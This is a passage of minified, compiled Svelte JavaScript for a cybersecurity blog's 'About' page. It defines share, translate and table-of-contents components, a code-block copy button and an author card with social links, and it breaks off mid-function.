import{S as us,i as fs,s as hs,R as Rn,d as n,w as B,y as $,T as On,U as Nn,V as Un,b as F,c as M,m,e as y,f as L,j as d,n as Hs,J as E,p as Oe,G as te,A as pe,r as ae,M as Te,v as N,D as U,B as W,C as V,E as Ne,Y as Ue,a as Sn,u as z,I as We,g as xn,h as u,t as Mn,k as f,x as Ae,z as Ce,F as ke,q as kn,o as K,H as Q,a4 as _l,a5 as $n,N as qs,a6 as Ve,a7 as $l,a8 as Hl}from"./C3_DH_NE.js";import"./IHki7fMi.js";import{s as G,e as oe,H as je,P as ze,F as Ge,f as ee,I as Gs}from"./5Gp7X5ME.js";function ce(i,s){const e={},a={},l={$$scope:1};let t=i.length;for(;t--;){const p=i[t],h=s[t];if(h){for(const v in p)v in h||(a[v]=1);for(const v in h)l[v]||(e[v]=h[v],l[v]=1);i[t]=h}else for(const v in p)l[v]=1}for(const p in a)p in e||(e[p]=void 0);return e}function Hn(i){return typeof i=="object"&&i!==null?i:{}}function qe(i){let s,e,a;const l=i[1].default,t=Rn(l,i,i[0],null);return{c(){s=d("div"),e=d("table"),t&&t.c(),this.h()},l(p){s=y(p,"DIV",{class:!0});var h=L(s);e=y(h,"TABLE",{class:!0});var v=L(e);t&&t.l(v),v.forEach(n),h.forEach(n),this.h()},h(){m(e,"class","table w-full"),m(s,"class","overflow-x-auto mb-4")},m(p,h){F(p,s,h),M(s,e),t&&t.m(e,null),a=!0},p(p,[h]){t&&t.p&&(!a||h&1)&&On(t,l,p,p[0],a?Un(l,p[0],h,null):Nn(p[0]),null)},i(p){a||($(t,p),a=!0)},o(p){B(t,p),a=!1},d(p){p&&n(s),t&&t.d(p)}}}function Ke(i,s,e){let{$$slots:a={},$$scope:l}=s;return i.$$set=t=>{"$$scope"in t&&e(0,l=t.$$scope)},[l,a]}class Qe extends us{constructor(s){super(),fs(this,s,Ke,qe,hs,{})}}function Ye(i){let s,e='<a href="#post-comment" class="btn btn-circle btn-ghost hover:bg-red-10"><span class="i-heroicons-outline-chat-alt-2"></span></a>';return{c(){s=d("button"),s.innerHTML=e,this.h()},l(a){s=y(a,"BUTTON",{class:!0,"data-tip":!0,"data-svelte-h":!0}),E(s)!=="svelte-k757pa"&&(s.innerHTML=e),this.h()},h(){m(s,"class","tooltip tooltip-left opacity-60 hover:opacity-100"),m(s,"data-tip","Jump to comments")},m(a,l){F(a,s,l)},p:Hs,i:Hs,o:Hs,d(a){a&&n(s)}}}class Ze extends us{constructor(s){super(),fs(this,s,null,Ye,hs,{})}}function Xe(i){let s,e,a,l;return{c(){s=d("button"),e=d("a"),a=d("span"),this.h()},l(t){s=y(t,"BUTTON",{class:!0,"data-tip":!0});var p=L(s);e=y(p,"A",{href:!0,class:!0});var h=L(e);a=y(h,"SPAN",{class:!0}),L(a).forEach(n),h.forEach(n),p.forEach(n),this.h()},h(){m(a,"class","i-heroicons-outline-share"),m(e,"href",l=`https://www.addtoany.com/share#url=${G.protocol+G.domain+i[0].path}&title=${encodeURI(i[0].title??i[0].path.slice(1))}`),m(e,"class","btn btn-circle btn-ghost"),m(s,"class","tooltip tooltip-left opacity-60 hover:opacity-100"),m(s,"data-tip","Share")},m(t,p){F(t,s,p),M(s,e),M(e,a)},p(t,[p]){p&1&&l!==(l=`https://www.addtoany.com/share#url=${G.protocol+G.domain+t[0].path}&title=${encodeURI(t[0].title??t[0].path.slice(1))}`)&&m(e,"href",l)},i:Hs,o:Hs,d(t){t&&n(s)}}}function Je(i,s,e){let{post:a}=s;return i.$$set=l=>{"post"in l&&e(0,a=l.post)},[a]}class sa extends us{constructor(s){super(),fs(this,s,Je,Xe,hs,{post:0})}}function la(i){let s,e,a,l;return{c(){s=d("button"),e=d("a"),a=d("span"),this.h()},l(t){s=y(t,"BUTTON",{class:!0,"data-tip":!0});var p=L(s);e=y(p,"A",{href:!0,class:!0});var h=L(e);a=y(h,"SPAN",{class:!0}),L(a).forEach(n),h.forEach(n),p.forEach(n),this.h()},h(){m(a,"class","i-heroicons-outline-translate"),m(e,"href",l=`https://translate.google.com/translate?sl=auto&tl=${navigator.languages?navigator.languages[0]:navigator.language}&u=${G.protocol+G.domain+i[0].path}`),m(e,"class","btn btn-circle btn-ghost"),m(s,"class","tooltip tooltip-left opacity-60 hover:opacity-100"),m(s,"data-tip","Translate")},m(t,p){F(t,s,p),M(s,e),M(e,a)},p(t,[p]){p&1&&l!==(l=`https://translate.google.com/translate?sl=auto&tl=${navigator.languages?navigator.languages[0]:navigator.language}&u=${G.protocol+G.domain+t[0].path}`)&&m(e,"href",l)},i:Hs,o:Hs,d(t){t&&n(s)}}}function na(i,s,e){let{post:a}=s;return i.$$set=l=>{"post"in l&&e(0,a=l.post)},[a]}class ea extends us{constructor(s){super(),fs(this,s,na,la,hs,{post:0})}}function Se(i,s,e){const a=i.slice();return a[2]=s[e],a}function aa(i){let s,e,a=oe(Object.values(i[1])),l=[];for(let p=0;p<a.length;p+=1)l[p]=xe(Se(i,a,p));const t=p=>B(l[p],1,1,()=>{l[p]=null});return{c(){for(let p=0;p<l.length;p+=1)l[p].c();s=ae()},l(p){for(let h=0;h<l.length;h+=1)l[h].l(p);s=ae()},m(p,h){for(let v=0;v<l.length;v+=1)l[v]&&l[v].m(p,h);F(p,s,h),e=!0},p(p,h){if(h&3){a=oe(Object.values(p[1]));let v;for(v=0;v<a.length;v+=1){const b=Se(p,a,v);l[v]?(l[v].p(b,h),$(l[v],1)):(l[v]=xe(b),l[v].c(),$(l[v],1),l[v].m(s.parentNode,s))}for(te(),v=a.length;v<l.length;v+=1)t(v);pe()}},i(p){if(!e){for(let h=0;h<a.length;h+=1)$(l[h]);e=!0}},o(p){l=l.filter(Boolean);for(let h=0;h<l.length;h+=1)B(l[h]);e=!1},d(p){p&&n(s),Oe(l,p)}}}function xe(i){let s,e,a;var l=i[2];function t(p,h){return{props:{post:p[0]}}}return l&&(s=Te(l,t(i))),{c(){s&&U(s.$$.fragment),e=ae()},l(p){s&&V(s.$$.fragment,p),e=ae()},m(p,h){s&&W(s,p,h),F(p,e,h),a=!0},p(p,h){if(l!==(l=p[2])){if(s){te();const v=s;B(v.$$.fragment,1,0,()=>{N(v,1)}),pe()}l?(s=Te(l,t(p)),U(s.$$.fragment),$(s.$$.fragment,1),W(s,e.parentNode,e)):s=null}else if(l){const v={};h&1&&(v.post=p[0]),s.$set(v)}},i(p){a||(s&&$(s.$$.fragment,p),a=!0)},o(p){s&&B(s.$$.fragment,p),a=!1},d(p){p&&n(e),s&&N(s,p)}}}function oa(i){let s,e=Object.keys(i[1]).length,a,l=e&&aa(i);return{c(){s=d("div"),l&&l.c(),this.h()},l(t){s=y(t,"DIV",{class:!0});var p=L(s);l&&l.l(p),p.forEach(n),this.h()},h(){m(s,"class","sticky top-24 hidden xl:flex flex-col gap-4 w-fit h-[calc(100vh-12rem)] ml-auto mr-8 my-8 justify-center")},m(t,p){F(t,s,p),l&&l.m(s,null),a=!0},p(t,[p]){e&&l.p(t,p)},i(t){a||($(l),a=!0)},o(t){B(l),a=!1},d(t){t&&n(s),l&&l.d()}}}function ta(i,s,e){let{post:a}=s;const l=Object.assign({"/src/lib/components/actions/comment.svelte":Ze,"/src/lib/components/actions/share.svelte":sa,"/src/lib/components/actions/translate.svelte":ea});return i.$$set=t=>{"post"in t&&e(0,a=t.post)},[a,l]}class pa extends us{constructor(s){super(),fs(this,s,ta,oa,hs,{post:0})}}function Me(i,s,e){const a=i.slice();return a[5]=s[e].depth,a[6]=s[e].slug,a[7]=s[e].title,a}function $e(i){let s,e,a=i[7]+"",l,t,p,h,v,b,T;function R(){return i[4](i[6])}return{c(){s=d("li"),e=d("span"),l=Mn(a),h=f(),this.h()},l(C){s=y(C,"LI",{class:!0,id:!0});var w=L(s);e=y(w,"SPAN",{class:!0,dir:!0,id:!0});var k=L(e);l=xn(k,a),k.forEach(n),h=u(w),w.forEach(n),this.h()},h(){m(e,"class",t="cursor-pointer border-l-4 border-transparent transition-all hover:border-primary hover:bg-base-content hover:bg-opacity-10 active:bg-primary active:text-primary-content active:font-bold pr-4"+(i[5]<=2?"py-3":"py-2")),m(e,"dir","ltr"),m(e,"id",p=`toc-link-${i[6]}`),z(e,"pl-4",i[5]<=2),z(e,"pl-8",i[5]===3),z(e,"pl-12",i[5]===4),z(e,"pl-16",i[5]===5),z(e,"pl-20",i[5]===6),m(s,"class","flex flex-col"),m(s,"id",v=`toc-item-${i[6]}`)},m(C,w){F(C,s,w),M(s,e),M(e,l),M(s,h),b||(T=We(e,"click",R),b=!0)},p(C,w){i=C,w&1&&a!==(a=i[7]+"")&&Sn(l,a),w&1&&t!==(t="cursor-pointer border-l-4 border-transparent transition-all hover:border-primary hover:bg-base-content hover:bg-opacity-10 active:bg-primary active:text-primary-content active:font-bold pr-4"+(i[5]<=2?"py-3":"py-2"))&&m(e,"class",t),w&1&&p!==(p=`toc-link-${i[6]}`)&&m(e,"id",p),w&1&&z(e,"pl-4",i[5]<=2),w&1&&z(e,"pl-8",i[5]===3),w&1&&z(e,"pl-12",i[5]===4),w&1&&z(e,"pl-16",i[5]===5),w&1&&z(e,"pl-20",i[5]===6),w&1&&v!==(v=`toc-item-${i[6]}`)&&m(s,"id",v)},d(C){C&&n(s),b=!1,T()}}}function Fa(i){let s,e,a,l=oe(i[0]),t=[];for(let p=0;p<l.length;p+=1)t[p]=$e(Me(i,l,p));return{c(){s=d("aside"),e=d("nav"),a=d("ul");for(let p=0;p<t.length;p+=1)t[p].c();this.h()},l(p){s=y(p,"ASIDE",{class:!0});var h=L(s);e=y(h,"NAV",{"aria-label":!0,class:!0,dir:!0,id:!0});var v=L(e);a=y(v,"UL",{dir:!0,id:!0});var b=L(a);for(let T=0;T<t.length;T+=1)t[T].l(b);b.forEach(n),v.forEach(n),h.forEach(n),this.h()},h(){m(a,"dir","ltr"),m(a,"id","toc-list-root"),m(e,"aria-label","TableOfContent"),m(e,"class","max-h-[calc(100vh-12rem)] overflow-y-hidden hover:overflow-y-auto"),m(e,"dir","rtl"),m(e,"id","post-toc"),m(s,"class","sticky top-16 py-8")},m(p,h){F(p,s,h),M(s,e),M(e,a);for(let v=0;v<t.length;v+=1)t[v]&&t[v].m(a,null)},p(p,[h]){if(h&1){l=oe(p[0]);let v;for(v=0;v<l.length;v+=1){const b=Me(p,l,v);t[v]?t[v].p(b,h):(t[v]=$e(b),t[v].c(),t[v].m(a,null))}for(;v<t.length;v+=1)t[v].d(1);t.length=l.length}},i:Hs,o:Hs,d(p){p&&n(s),Oe(t,p)}}}function ra(i,s,e){let{toc:a}=s,l=[],t=!0,p=[];Ne(()=>{if(window.screen.availWidth>=1280){const v=new IntersectionObserver(T=>T.forEach(R=>R.isIntersecting?l.push(R.target.id):e(1,l=l.filter(C=>C!==R.target.id))),{rootMargin:"-64px 0px 0px 0px"}),b=new IntersectionObserver(T=>e(2,t=T[0].isIntersecting));Array.from(document.querySelectorAll("main h2, main h3, main h4, main h5, main h6")).forEach(T=>v.observe(T)),b.observe(document.getElementsByTagName("main")[0])}}),Ue(()=>{typeof headingsObserver<"u"&&headingsObserver.disconnect(),typeof articleObserver<"u"&&articleObserver.disconnect()});const h=v=>document.getElementById(v).scrollIntoView({behavior:"smooth"});return i.$$set=v=>{"toc"in v&&e(0,a=v.toc)},i.$$.update=()=>{i.$$.dirty&2&&l.length>0&&e(3,p=l),i.$$.dirty&4&&t===!1&&e(3,p=[]),i.$$.dirty&9&&p&&a.forEach(v=>{var b,T;return p.includes(v.slug)?(b=document.getElementById(`toc-link-${v.slug}`))==null?void 0:b.classList.add("!border-accent"):(T=document.getElementById(`toc-link-${v.slug}`))==null?void 0:T.classList.remove("!border-accent")})},[a,l,t,p,h]}class ia extends us{constructor(s){super(),fs(this,s,ra,Fa,hs,{toc:0})}}const ca=()=>{const i=document.querySelectorAll("pre"),s="i-mdi-clipboard-text",e="i-mdi-check",a=async(l,t)=>{const p=document.createRange(),h=l.childNodes.length;p.setStart(l,2),p.setEnd(l,h);const v=window.getSelection();v&&(v.removeAllRanges(),v.addRange(p),await navigator.clipboard.writeText(v.toString()),t.classList.replace(s,e),setTimeout(()=>{t.classList.replace(e,s)},1e3),v.removeRange(p))};i.forEach(l=>{l.classList.add("my-custom-class"),l.classList.remove("existing-class"),l.classList.toggle("highlight",!0);const t=document.createElement("button");t.classList.add(s,"btn","btn-secondary","btn-xs","absolute","right-2","top-3","hidden"),l.prepend(t),l.addEventListener("mouseenter",()=>{t.classList.remove("hidden")}),l.addEventListener("mouseleave",()=>{t.classList.add("hidden")}),t.addEventListener("click",p=>{p.preventDefault(),a(l,t)})})};function ya(i){let s,e;return s=new pa({props:{post:i[0]}}),{c(){U(s.$$.fragment)},l(a){V(s.$$.fragment,a)},m(a,l){W(s,a,l),e=!0},p(a,l){const t={};l&1&&(t.post=a[0]),s.$set(t)},i(a){e||($(s.$$.fragment,a),e=!0)},o(a){B(s.$$.fragment,a),e=!1},d(a){N(s,a)}}}function He(i){let s,e,a;return e=new ia({props:{toc:i[0].toc}}),{c(){s=d("div"),U(e.$$.fragment),this.h()},l(l){s=y(l,"DIV",{class:!0});var t=L(s);V(e.$$.fragment,t),t.forEach(n),this.h()},h(){m(s,"class","h-full hidden xl:block")},m(l,t){F(l,s,t),W(e,s,null),a=!0},p(l,t){const p={};t&1&&(p.toc=l[0].toc),e.$set(p)},i(l){a||($(e.$$.fragment,l),a=!0)},o(l){B(e.$$.fragment,l),a=!1},d(l){l&&n(s),N(e)}}}function da(i){let s;const e=i[1].default,a=Rn(e,i,i[2],null);return{c(){a&&a.c()},l(l){a&&a.l(l)},m(l,t){a&&a.m(l,t),s=!0},p(l,t){a&&a.p&&(!s||t&4)&&On(a,e,l,l[2],s?Un(e,l[2],t,null):Nn(l[2]),null)},i(l){s||($(a,l),s=!0)},o(l){B(a,l),s=!1},d(l){a&&a.d(l)}}}function va(i){let s,e,a,l,t,p,h,v,b,T,R,C,w,k,D,x;s=new je({props:{post:i[0]}});let P=ya(i),A=i[0].toc&&He(i);return w=new ze({props:{post:i[0],$$slots:{default:[da]},$$scope:{ctx:i}}}),D=new Ge({props:{sticky:!0}}),{c(){U(s.$$.fragment),e=f(),a=d("div"),l=d("div"),P&&P.c(),h=f(),v=d("div"),A&&A.c(),R=f(),C=d("div"),U(w.$$.fragment),k=f(),U(D.$$.fragment),this.h()},l(_){V(s.$$.fragment,_),e=u(_),a=y(_,"DIV",{class:!0});var H=L(a);l=y(H,"DIV",{class:!0});var j=L(l);P&&P.l(j),j.forEach(n),h=u(H),v=y(H,"DIV",{class:!0});var O=L(v);A&&A.l(O),O.forEach(n),R=u(H),C=y(H,"DIV",{class:!0});var S=L(C);V(w.$$.fragment,S),k=u(S),V(D.$$.fragment,S),S.forEach(n),H.forEach(n),this.h()},h(){m(l,"class","flex-1 w-full order-first ease-out transform mx-auto xl:mr-0 xl:ml-0"),m(v,"class","flex-1 w-full xl:order-last ease-out transform mx-auto xl:ml-0 xl:mr-0"),m(C,"class","flex-none w-full max-w-screen-md mx-auto xl:mx-0"),m(a,"class","flex flex-col flex-nowrap justify-center xl:flex-row xl:flex-wrap")},m(_,H){W(s,_,H),F(_,e,H),F(_,a,H),M(a,l),P&&P.m(l,null),M(a,h),M(a,v),A&&A.m(v,null),M(a,R),M(a,C),W(w,C,null),M(C,k),W(D,C,null),x=!0},p(_,[H]){const j={};H&1&&(j.post=_[0]),s.$set(j),P.p(_,H),_[0].toc?A?(A.p(_,H),H&1&&$(A,1)):(A=He(_),A.c(),$(A,1),A.m(v,null)):A&&(te(),B(A,1,1,()=>{A=null}),pe());const O={};H&1&&(O.post=_[0]),H&4&&(O.$$scope={dirty:H,ctx:_}),w.$set(O)},i(_){x||($(s.$$.fragment,_),$(P),_&&Ce(()=>{x&&(p&&p.end(1),t=ke(l,ee,{delay:500,duration:300,x:25}),t.start())}),$(A),_&&Ce(()=>{x&&(T&&T.end(1),b=ke(v,ee,{delay:500,duration:300,x:-25}),b.start())}),$(w.$$.fragment,_),$(D.$$.fragment,_),x=!0)},o(_){B(s.$$.fragment,_),B(P),t&&t.invalidate(),_&&(p=Ae(l,ee,{duration:300,x:25})),B(A),b&&b.invalidate(),_&&(T=Ae(v,ee,{duration:300,x:-25})),B(w.$$.fragment,_),B(D.$$.fragment,_),x=!1},d(_){_&&(n(e),n(a)),N(s,_),P&&P.d(),_&&p&&p.end(),A&&A.d(),_&&T&&T.end(),N(w),N(D)}}}function ua(i,s,e){let{$$slots:a={},$$scope:l}=s,{post:t}=s;return Ne(()=>{ca()}),i.$$set=p=>{"post"in p&&e(0,t=p.post),"$$scope"in p&&e(2,l=p.$$scope)},[t,a,l]}class fa extends us{constructor(s){super(),fs(this,s,ua,va,hs,{post:0})}}function ha(i){let s;const e=i[13].default,a=Rn(e,i,i[14],null);return{c(){a&&a.c()},l(l){a&&a.l(l)},m(l,t){a&&a.m(l,t),s=!0},p(l,t){a&&a.p&&(!s||t&16384)&&On(a,e,l,l[14],s?Un(e,l[14],t,null):Nn(l[14]),null)},i(l){s||($(a,l),s=!0)},o(l){B(a,l),s=!1},d(l){a&&a.d(l)}}}function ma(i){let s,e;return s=new fa({props:{post:i[0],$$slots:{default:[ha]},$$scope:{ctx:i}}}),{c(){U(s.$$.fragment)},l(a){V(s.$$.fragment,a)},m(a,l){W(s,a,l),e=!0},p(a,[l]){const t={};l&16384&&(t.$$scope={dirty:l,ctx:a}),s.$set(t)},i(a){e||($(s.$$.fragment,a),e=!0)},o(a){B(s.$$.fragment,a),e=!1},d(a){N(s,a)}}}function ga(i,s,e){let{$$slots:a={},$$scope:l}=s,{path:t}=s,{slug:p}=s,{toc:h}=s,{created:v}=s,{updated:b}=s,{published:T}=s,{summary:R}=s,{tags:C}=s,{flags:w}=s,{title:k}=s,{image:D}=s,{in_reply_to:x}=s;const P={created:v,flags:w,image:D,in_reply_to:x,path:t,published:T,slug:p,summary:R,tags:C,title:k,toc:h,updated:b},A={type:Ua(P),...P};return i.$$set=_=>{"path"in _&&e(1,t=_.path),"slug"in _&&e(2,p=_.slug),"toc"in _&&e(3,h=_.toc),"created"in _&&e(4,v=_.created),"updated"in _&&e(5,b=_.updated),"published"in _&&e(6,T=_.published),"summary"in _&&e(7,R=_.summary),"tags"in _&&e(8,C=_.tags),"flags"in _&&e(9,w=_.flags),"title"in _&&e(10,k=_.title),"image"in _&&e(11,D=_.image),"in_reply_to"in _&&e(12,x=_.in_reply_to),"$$scope"in _&&e(14,l=_.$$scope)},[A,t,p,h,v,b,T,R,C,w,k,D,x,a,l]}class ye extends us{constructor(s){super(),fs(this,s,ga,ma,hs,{path:1,slug:2,toc:3,created:4,updated:5,published:6,summary:7,tags:8,flags:9,title:10,image:11,in_reply_to:12})}}function Be(i){let s,e;return{c(){s=d("div"),e=Mn(i[2]),this.h()},l(a){s=y(a,"DIV",{class:!0});var l=L(s);e=xn(l,i[2]),l.forEach(n),this.h()},h(){m(s,"class","opacity-50")},m(a,l){F(a,s,l),M(s,e)},p(a,l){l&4&&Sn(e,a[2])},d(a){a&&n(s)}}}function Ie(i){let s,e,a=(i[3]??G.author.bio)+"";return{c(){s=d("div"),e=new Q(!1),this.h()},l(l){s=y(l,"DIV",{});var t=L(s);e=K(t,!1),t.forEach(n),this.h()},h(){e.a=null},m(l,t){F(l,s,t),e.m(a,s)},p(l,t){t&8&&a!==(a=(l[3]??G.author.bio)+"")&&e.p(a)},d(l){l&&n(s)}}}function _a(i){let s,e,a=(i[1]??G.author.name)+"",l,t,p,h,v,b,T,R,C,w,k=(i[1]??G.author.name)+"",D,x,P,A,_=i[2]&&Be(i),H=(i[3]||G.author.bio)&&Ie(i);const j=i[5].default,O=Rn(j,i,i[4],null);return{c(){s=d("div"),e=d("div"),l=Mn(a),t=f(),p=d("div"),h=d("div"),v=d("img"),R=f(),_&&_.c(),C=f(),w=d("div"),D=Mn(k),x=f(),H&&H.c(),P=f(),O&&O.c(),this.h()},l(S){s=y(S,"DIV",{class:!0});var I=L(s);e=y(I,"DIV",{class:!0});var as=L(e);l=xn(as,a),as.forEach(n),t=u(I),p=y(I,"DIV",{class:!0});var Ks=L(p);h=y(Ks,"DIV",{class:!0});var J=L(h);v=y(J,"IMG",{class:!0,alt:!0,loading:!0,decoding:!0,src:!0}),J.forEach(n),Ks.forEach(n),R=u(I),_&&_.l(I),C=u(I),w=y(I,"DIV",{class:!0});var ms=L(w);D=xn(ms,k),ms.forEach(n),x=u(I),H&&H.l(I),P=u(I),O&&O.l(I),I.forEach(n),this.h()},h(){m(e,"class","absolute -top-4 opacity-10 text-[12rem] text-neutral leading-tight rotate-[30deg]"),m(v,"class","hover:rotate-[360deg] transition-transform duration-1000 ease-in-out m-0"),m(v,"alt",b=i[1]??G.author.name),m(v,"loading","lazy"),m(v,"decoding","async"),kn(v.src,T=i[0]??G.author.avatar)||m(v,"src",T),m(h,"class","rounded-full border-2 border-white shadow-xl w-16 h-16"),m(p,"class","avatar mb-4"),m(w,"class","text-2xl mb-2"),m(s,"class","relative w-auto min-h-48 rounded-box overflow-hidden bg-gradient-to-b from-primary to-secondary text-primary-content transition-shadow duration-200 shadow-xl hover:shadow-2xl p-4 md:p-8 my-4")},m(S,I){F(S,s,I),M(s,e),M(e,l),M(s,t),M(s,p),M(p,h),M(h,v),M(s,R),_&&_.m(s,null),M(s,C),M(s,w),M(w,D),M(s,x),H&&H.m(s,null),M(s,P),O&&O.m(s,null),A=!0},p(S,[I]){(!A||I&2)&&a!==(a=(S[1]??G.author.name)+"")&&Sn(l,a),(!A||I&2&&b!==(b=S[1]??G.author.name))&&m(v,"alt",b),(!A||I&1&&!kn(v.src,T=S[0]??G.author.avatar))&&m(v,"src",T),S[2]?_?_.p(S,I):(_=Be(S),_.c(),_.m(s,C)):_&&(_.d(1),_=null),(!A||I&2)&&k!==(k=(S[1]??G.author.name)+"")&&Sn(D,k),(S[3]||G.author.bio)&&(H?H.p(S,I):(H=Ie(S),H.c(),H.m(s,P))),O&&O.p&&(!A||I&16)&&On(O,j,S,S[4],A?Un(j,S[4],I,null):Nn(S[4]),null)},i(S){A||($(O,S),A=!0)},o(S){B(O,S),A=!1},d(S){S&&n(s),_&&_.d(),H&&H.d(),O&&O.d(S)}}}function Ea(i,s,e){let{$$slots:a={},$$scope:l}=s,{avatar:t}=s,{name:p}=s,{subname:h}=s,{bio:v}=s;return i.$$set=b=>{"avatar"in b&&e(0,t=b.avatar),"name"in b&&e(1,p=b.name),"subname"in b&&e(2,h=b.subname),"bio"in b&&e(3,v=b.bio),"$$scope"in b&&e(4,l=b.$$scope)},[t,p,h,v,l,a]}class ba extends us{constructor(s){super(),fs(this,s,Ea,_a,hs,{avatar:0,name:1,subname:2,bio:3})}}function wa(i){let s,e='<a href="https://x.com/kryptoenix" rel="noopener external" target="_blank" class="group flex-1 relative overflow-hidden btn btn-block normal-case border-none no-underline bg-black hover:bg-[#333333]"><span class="i-simple-icons-x absolute w-16 h-16 left-10 opacity-20 fill-white transform-gpu transition-transform ease-in-out duration-500 group-hover:scale-125"></span> <span class="z-10 !text-white">@kryptoenix</span></a> <a href="https://discord.com/users/400270681713147915" rel="noopener external" target="_blank" class="group flex-1 relative overflow-hidden btn btn-block normal-case border-none no-underline bg-[#5865f2] hover:bg-[#7983f5]"><span class="i-simple-icons-discord absolute w-16 h-16 right-10 opacity-20 fill-white transform-gpu transition-transform ease-in-out duration-500 group-hover:scale-125"></span> <span class="z-10 !text-white">Kryptoenix</span></a>';return{c(){s=d("div"),s.innerHTML=e,this.h()},l(a){s=y(a,"DIV",{class:!0,"data-svelte-h":!0}),E(s)!=="svelte-oh5qyf"&&(s.innerHTML=e),this.h()},h(){m(s,"class","flex flex-col md:flex-row gap-4 mt-4")},m(a,l){F(a,s,l)},p:Hs,d(a){a&&n(s)}}}function Da(i){let s,e,a,l='<a href="#hello-world">Hello World</a>',t;return s=new ba({props:{subname:":)",bio:"Hello there!<br>Welcome to an exciting journey viewed through the lens of cybersecurity.<br>I hope you find the knowledge here both useful and insightful.",$$slots:{default:[wa]},$$scope:{ctx:i}}}),{c(){U(s.$$.fragment),e=f(),a=d("h2"),a.innerHTML=l,this.h()},l(p){V(s.$$.fragment,p),e=u(p),a=y(p,"H2",{id:!0,"data-svelte-h":!0}),E(a)!=="svelte-147ofme"&&(a.innerHTML=l),this.h()},h(){m(a,"id","hello-world")},m(p,h){W(s,p,h),F(p,e,h),F(p,a,h),t=!0},p(p,h){const v={};h&2&&(v.$$scope={dirty:h,ctx:p}),s.$set(v)},i(p){t||($(s.$$.fragment,p),t=!0)},o(p){B(s.$$.fragment,p),t=!1},d(p){p&&(n(e),n(a)),N(s,p)}}}function La(i){let s,e;const a=[i[0],Fe];let l={$$slots:{default:[Da]},$$scope:{ctx:i}};for(let t=0;t<a.length;t+=1)l=_l(l,a[t]);return s=new ye({props:l}),{c(){U(s.$$.fragment)},l(t){V(s.$$.fragment,t)},m(t,p){W(s,t,p),e=!0},p(t,[p]){const h=p&1?ce(a,[p&1&&Hn(t[0]),p&0&&Hn(Fe)]):{};p&2&&(h.$$scope={dirty:p,ctx:t}),s.$set(h)},i(t){e||($(s.$$.fragment,t),e=!0)},o(t){B(s.$$.fragment,t),e=!1},d(t){N(s,t)}}}const Fe={title:"About",flags:["unlisted"],created:"2025-08-28T16:54:03.775Z",updated:"2025-08-28T16:54:03.775Z",images:[],tags:[],slug:"/about/+page.svelte.md",path:"/blog/about",toc:[{depth:2,slug:"hello-world",title:"Hello World"}]},{title:za,flags:Ga,created:qa,updated:Ka,alt:Qa,audio:Ya,image:Za,images:Xa,lang:Ja,tags:so,video:lo,slug:no,path:eo,toc:ao}=Fe;function Ta(i,s,e){return i.$$set=a=>{e(0,s=_l(_l({},s),$n(a)))},s=$n(s),[s]}let oo=class extends us{constructor(s){super(),fs(this,s,Ta,La,hs,{})}};function Aa(i){let s,e;return{c(){s=Hl("svg"),e=Hl("path"),this.h()},l(a){s=$l(a,"svg",{xmlns:!0,fill:!0,viewBox:!0,"stroke-width":!0,stroke:!0,class:!0});var l=L(s);e=$l(l,"path",{"stroke-linecap":!0,"stroke-linejoin":!0,d:!0}),L(e).forEach(n),l.forEach(n),this.h()},h(){m(e,"stroke-linecap","round"),m(e,"stroke-linejoin","round"),m(e,"d","M11.25 9h.008v.008H11.25V9zm.75 4.5v3.75m0-12a9 9 0 100 18 9 9 0 000-18z"),m(s,"xmlns","http://www.w3.org/2000/svg"),m(s,"fill","none"),m(s,"viewBox","0 0 24 24"),m(s,"stroke-width","1.5"),m(s,"stroke","currentColor"),m(s,"class","w-24 h-24 text-black-500")},m(a,l){F(a,s,l),M(s,e)},d(a){a&&n(s)}}}function Ca(i){let s,e;return{c(){s=Hl("svg"),e=Hl("path"),this.h()},l(a){s=$l(a,"svg",{xmlns:!0,fill:!0,viewBox:!0,"stroke-width":!0,stroke:!0,class:!0});var l=L(s);e=$l(l,"path",{"stroke-linecap":!0,"stroke-linejoin":!0,d:!0}),L(e).forEach(n),l.forEach(n),this.h()},h(){m(e,"stroke-linecap","round"),m(e,"stroke-linejoin","round"),m(e,"d","M9.75 9.75l4.5 4.5m0-4.5l-4.5 4.5m9.75-2.25a9 9 0 11-18 0 9 9 0 0118 0z"),m(s,"xmlns","http://www.w3.org/2000/svg"),m(s,"fill","none"),m(s,"viewBox","0 0 24 24"),m(s,"stroke-width","1.5"),m(s,"stroke","currentColor"),m(s,"class","w-10 h-10 text-red-600")},m(a,l){F(a,s,l),M(s,e)},d(a){a&&n(s)}}}function ka(i){let s,e;return{c(){s=Hl("svg"),e=Hl("path"),this.h()},l(a){s=$l(a,"svg",{xmlns:!0,fill:!0,viewBox:!0,"stroke-width":!0,stroke:!0,class:!0});var l=L(s);e=$l(l,"path",{"stroke-linecap":!0,"stroke-linejoin":!0,d:!0}),L(e).forEach(n),l.forEach(n),this.h()},h(){m(e,"stroke-linecap","round"),m(e,"stroke-linejoin","round"),m(e,"d","M12 9v3.75m0 3.75h.008v.008H12v-.008zm0 0a9 9 0 100-18 9 9 0 000 18z"),m(s,"xmlns","http://www.w3.org/2000/svg"),m(s,"fill","none"),m(s,"viewBox","0 0 24 24"),m(s,"stroke-width","1.5"),m(s,"stroke","currentColor"),m(s,"class","w-10 h-10 text-yellow-500")},m(a,l){F(a,s,l),M(s,e)},d(a){a&&n(s)}}}function Sa(i){let s,e;return{c(){s=Hl("svg"),e=Hl("path"),this.h()},l(a){s=$l(a,"svg",{xmlns:!0,fill:!0,viewBox:!0,"stroke-width":!0,stroke:!0,class:!0});var l=L(s);e=$l(l,"path",{"stroke-linecap":!0,"stroke-linejoin":!0,d:!0}),L(e).forEach(n),l.forEach(n),this.h()},h(){m(e,"stroke-linecap","round"),m(e,"stroke-linejoin","round"),m(e,"d","M9 12.75L11.25 15 15 9.75m-3-6.75a9 9 0 110 18 9 9 0 010-18z"),m(s,"xmlns","http://www.w3.org/2000/svg"),m(s,"fill","none"),m(s,"viewBox","0 0 24 24"),m(s,"stroke-width","1.5"),m(s,"stroke","currentColor"),m(s,"class","w-10 h-10 text-green-600")},m(a,l){F(a,s,l),M(s,e)},d(a){a&&n(s)}}}function Pe(i){let s,e;return{c(){s=d("div"),e=Mn(i[1]),this.h()},l(a){s=y(a,"DIV",{style:!0,class:!0});var l=L(s);e=xn(l,i[1]),l.forEach(n),this.h()},h(){qs(s,"font-size","16px"),m(s,"class","text-xs")},m(a,l){F(a,s,l),M(s,e)},p(a,l){l&2&&Sn(e,a[1])},d(a){a&&n(s)}}}function Re(i){let s,e;const a=i[5].default,l=Rn(a,i,i[4],null);return{c(){s=d("div"),l&&l.c(),this.h()},l(t){s=y(t,"DIV",{class:!0});var 